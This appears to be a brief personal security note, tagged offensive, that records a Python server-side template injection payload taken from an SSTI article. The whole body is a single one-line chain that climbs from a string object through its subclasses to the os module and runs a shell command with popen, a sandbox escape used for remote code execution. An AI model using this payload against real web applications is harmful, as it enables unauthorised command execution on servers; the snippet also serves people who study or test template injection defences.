---
slug: referencing-sys-modules-py
title: Referencing System Modules Using Python
description: Referencing System Modules Using Python
authors: [kbbgl]
tags: [cybersecurity,offensive,python,sys,module,shell]
---

[Source](https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part)

```python
"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()
```
